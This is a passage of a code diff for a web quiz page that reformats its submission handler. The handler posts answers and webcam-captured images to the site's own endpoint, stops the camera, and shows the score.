+                    '/submit-answer',
+                    {
 
-                headers: {
-                    'Content-Type': 'application/json'
-                },
+                        method: 'POST',
 
-                body: JSON.stringify({
+                        headers: {
 
-                    answers: answers,
+                            'Content-Type':
+                                'application/json'
 
-                    images: capturedImages
+                        },
 
-                })
+                        body:
+                            JSON.stringify({
 
-            });
+                                answers:
+                                    answers.map(
+                                        item =>
+                                            item.answer
+                                    ),
+
+                                images:
+                                    capturedImages
+
+                            })
+
+                    }
+                );
 
 
-            const data = await response.json();
+            const data =
+                await response.json();
 
 
             if (!response.ok) {
 
+
                 throw new Error(
-                    data.message || 'Submission failed.'
+                    data.message ||
+                    'Submission failed.'
                 );
+
             }
 
 
             // Stop camera
+
             if (cameraStream) {
 
-                cameraStream.getTracks().forEach(track => {
-                    track.stop();
-                });
+
+                cameraStream
+                    .getTracks()
+                    .forEach(
+                        track => {
+
+                            track.stop();
+
+                        }
+                    );
 
             }
 
 
-            document.getElementById('quizScreen').style.display = 'none';
+            // Hide quiz
 
-            document.getElementById('resultScreen').classList.add('show');
+            document.getElementById(
+                'quizScreen'
+            ).style.display =
+                'none';
+
+
+            // Show result
+
+            document.getElementById(
+                'scoreText'
+            ).textContent =
+                `Score: ${score} / ${questions.length}`;
+
+
+            document.getElementById(
+                'resultScreen'
+            ).classList.add(
+                'show'
+            );
 
 
         } catch (error) {
 
-            console.error('Submission error:', error);
+
+            console.error(
+                'Submission error:',
+                error
+            );
+
 
             alert(
                 'Something went wrong while submitting the quiz. Please try again.'
             );
 
-            document.getElementById('nextButton').disabled = false;
 
-            document.getElementById('backButton').disabled =
+            document.getElementById(
+                'nextButton'
+            ).disabled = false;
+
+
+            document.getElementById(
+                'backButton'
+            ).disabled =
                 currentQuestion === 0;
 
-            document.getElementById('loading').style.display = 'none';
+
+            document.getElementById(
+                'loading'
+            ).style.display =
+                'none';
 
         }
 
@@ -813,5 +2150,7 @@
 
 </script>
 
+
 </body>
+
 </html>
